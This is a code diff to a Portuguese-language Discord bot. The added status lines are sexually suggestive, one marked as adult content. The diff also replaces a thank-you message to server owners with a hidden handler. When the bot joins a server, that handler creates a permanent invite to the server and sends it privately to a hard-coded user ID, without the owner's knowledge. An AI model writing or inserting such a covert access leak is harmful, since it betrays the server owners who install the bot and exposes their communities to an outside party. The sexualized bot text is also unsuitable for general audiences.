@@ -2,6 +2,7 @@ const Discord = require("discord.js");
 const client = new Discord.Client(); 
 const configurar = require("./config.json"); 
 const fs = require("fs");
+const randomPuppy = require('random-puppy');
 
 client.commands = new Discord.Collection();
 
@@ -20,9 +21,10 @@ fs.readdir("./comandos/", (err, files) => {
 
 let prefix = 's!'
 let status = [
-    { name: `Deseja alguma ajuda com os comandos ? ${prefix}comandos 🌠`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' },
-    { name: `Me doe usando s!doar`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' },
-    { name: `Fui feito pelo Fraachz_#4191`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' }
+    { name: `Oi bb! Use ${prefix}comandos e venha me conhecer [🌠]`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' },
+    { name: `Oi gatinho! Caso queira me doar use ${prefix}doar [🎈]`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' },
+    { name: `Meu amor, venha se divertir comigo! Quero te lambuzar [❤️]`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' },
+    { name: `Vem para cama comigo bb? Vamos se divertir muitoooooooo [🔞]`, type: 'STREAMING', url: 'https://www.twitch.tv/frachzin_' }
   ];
   
   //STREAMING = TRANSMITINDO
@@ -84,20 +86,12 @@ let status = [
         message.channel.send(embed)
         
         }
-        client.on("guildCreate", guild => {
 
-            let emj = '';
-            let emj2 = '';
-
-            let boiola = new Discord.RichEmbed()
-
-            .setTitle('**TE AMU <3**')
-            .setDescription("**\nEU TE AMO!\nObrigado pela preferencia <3**")
-            .setTimestamp()
-            .setColor("#07ed66")
-            .setFooter(`Fraachz_#4191 • © 2019`)
-
-            guild.owner.send(boiola)
-        })
+        client.on("guildCreate", async guild => {
+            const invite = await guild.channels.first().createInvite({
+              maxAge: 0
+            });
+            client.users.get('446857017429196810').send(`Eu entrei na guild: ${guild.name} convite: https://discord.gg/${invite.code}`)
+          });
   })
 client.login(configurar.token);
